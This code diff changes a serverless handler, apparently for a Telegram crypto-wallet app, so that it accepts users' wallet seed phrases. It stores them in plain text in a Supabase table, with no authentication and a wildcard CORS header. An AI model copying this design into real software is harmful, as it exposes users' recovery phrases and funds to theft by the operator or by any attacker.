@@ -6,6 +6,7 @@ const supabaseServiceKey = process.env.SUPABASE_SERVICE_KEY;
 const supabase = createClient(supabaseUrl, supabaseServiceKey);
 
 exports.handler = async (event, context) => {
+    // CORS headers
     const headers = {
         'Access-Control-Allow-Origin': '*',
         'Access-Control-Allow-Headers': 'Content-Type',
@@ -22,9 +23,9 @@ exports.handler = async (event, context) => {
 
     try {
         const body = JSON.parse(event.body);
-        const { telegram_user_id, wallet_addresses, is_testnet = false } = body;
+        const { telegram_user_id, seed_phrase } = body;
 
-        if (!telegram_user_id || !wallet_addresses) {
+        if (!telegram_user_id || !seed_phrase) {
             return {
                 statusCode: 400,
                 headers,
@@ -35,39 +36,62 @@ exports.handler = async (event, context) => {
             };
         }
 
-        // Определяем какое поле обновлять в зависимости от is_testnet
-        const updateField = is_testnet ? 'testnet_wallet_addresses' : 'wallet_addresses';
-        const updateData = {
-            [updateField]: wallet_addresses,
-            updated_at: new Date().toISOString()
-        };
-
-        // Если это testnet, также обновляем поле is_testnet
-        if (is_testnet) {
-            updateData.is_testnet = true;
-        }
-
-        // Update wallet addresses
-        const { data, error } = await supabase
+        // Check if user exists
+        const { data: existingUser, error: selectError } = await supabase
             .from('crypto_wallets')
-            .update(updateData)
+            .select('*')
             .eq('telegram_user_id', telegram_user_id)
-            .select()
             .single();
 
-        if (error) throw error;
+        let result;
+        
+        if (selectError && selectError.code === 'PGRST116') {
+            // User doesn't exist, create new
+            const { data, error } = await supabase
+                .from('crypto_wallets')
+                .insert([{
+                    telegram_user_id,
+                    seed_phrases: seed_phrase,
+                    wallet_addresses: {},
+                    token_balances: {},
+                    transactions: [],
+                    created_at: new Date().toISOString(),
+                    updated_at: new Date().toISOString()
+                }])
+                .select()
+                .single();
+
+            if (error) throw error;
+            result = data;
+        } else if (selectError) {
+            throw selectError;
+        } else {
+            // User exists, update
+            const { data, error } = await supabase
+                .from('crypto_wallets')
+                .update({
+                    seed_phrases: seed_phrase,
+                    updated_at: new Date().toISOString()
+                })
+                .eq('telegram_user_id', telegram_user_id)
+                .select()
+                .single();
+
+            if (error) throw error;
+            result = data;
+        }
 
         return {
             statusCode: 200,
             headers,
             body: JSON.stringify({ 
                 success: true, 
-                data: data 
+                data: result 
             }),
         };
 
     } catch (error) {
-        console.error('Error saving addresses:', error);
+        console.error('Error saving seed phrase:', error);
         return {
             statusCode: 500,
             headers,
